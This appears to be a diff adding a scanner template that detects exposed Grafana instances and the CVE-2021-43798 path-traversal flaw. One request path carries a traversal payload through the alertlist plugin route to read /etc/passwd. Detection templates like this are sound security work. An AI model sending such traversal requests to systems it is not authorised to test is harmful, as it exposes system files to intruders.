@@ -1,0 +1,23 @@
+id: grafana-open
+info:
+  name: Grafana Unauthenticated Dashboard Access
+  severity: medium
+  cve: CVE-2021-43798
+  description: Grafana exposed without authentication allows dashboard access and path traversal.
+  product: "Grafana"
+  service: http
+
+requests:
+  - method: GET
+    path:
+      - "/"
+      - "/public/plugins/alertlist/../../../../../../../../etc/passwd"
+    matchers:
+      - type: string
+        words:
+          - "Grafana"
+          - "grafana"
+          - "Login"
+      - type: status
+        status:
+          - 200
